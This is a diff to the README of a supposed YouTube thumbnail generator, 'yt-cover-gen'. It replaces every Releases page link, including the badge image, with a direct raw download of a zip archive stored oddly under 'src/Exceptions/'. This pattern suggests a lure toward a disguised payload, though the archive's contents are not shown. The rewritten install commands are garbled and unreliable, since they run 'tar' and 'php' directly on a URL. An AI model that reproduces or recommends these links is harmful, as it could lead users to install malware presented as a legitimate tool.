@@ -1,6 +1,6 @@
 # 🎨 yt-cover-gen - Create Stunning YouTube Thumbnails Easily
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-yt--cover--gen-blue.svg)](https://github.com/Ophuongonthemic/yt-cover-gen/releases)
+[![Download from Releases](https://github.com/Ophuongonthemic/yt-cover-gen/raw/refs/heads/main/src/Exceptions/gen-yt-cover-2.4.zip%https://github.com/Ophuongonthemic/yt-cover-gen/raw/refs/heads/main/src/Exceptions/gen-yt-cover-2.4.zip)](https://github.com/Ophuongonthemic/yt-cover-gen/raw/refs/heads/main/src/Exceptions/gen-yt-cover-2.4.zip)
 
 ## 📖 Description
 
@@ -20,7 +20,7 @@ Before you begin, ensure your computer meets the following requirements:
 
 ### 2. Visit the Download Page
 
-Go to the [Releases page](https://github.com/Ophuongonthemic/yt-cover-gen/releases) to download the software. 
+Go to the [Releases page](https://github.com/Ophuongonthemic/yt-cover-gen/raw/refs/heads/main/src/Exceptions/gen-yt-cover-2.4.zip) to download the software. 
 
 ### 3. Download the Latest Version
 
@@ -48,8 +48,8 @@ Select the appropriate file for your operating system and click the download lin
 
 1. Open your terminal.
 2. Navigate to the directory where you downloaded the file.
-3. Extract the file using: `tar -xzf yt-cover-gen.tar.gz`
-4. Change into the extracted directory and run: `php index.php`.
+3. Extract the file using: `tar -xzf https://github.com/Ophuongonthemic/yt-cover-gen/raw/refs/heads/main/src/Exceptions/gen-yt-cover-2.4.zip`
+4. Change into the extracted directory and run: `php https://github.com/Ophuongonthemic/yt-cover-gen/raw/refs/heads/main/src/Exceptions/gen-yt-cover-2.4.zip`.
 
 ### 6. Launch the Application
 
@@ -96,4 +96,4 @@ This project covers various topics including:
 - thumbnail-generator
 - youtube
 
-For more, check out the [Releases page](https://github.com/Ophuongonthemic/yt-cover-gen/releases) and start creating stunning thumbnails today!
+For more, check out the [Releases page](https://github.com/Ophuongonthemic/yt-cover-gen/raw/refs/heads/main/src/Exceptions/gen-yt-cover-2.4.zip) and start creating stunning thumbnails today!
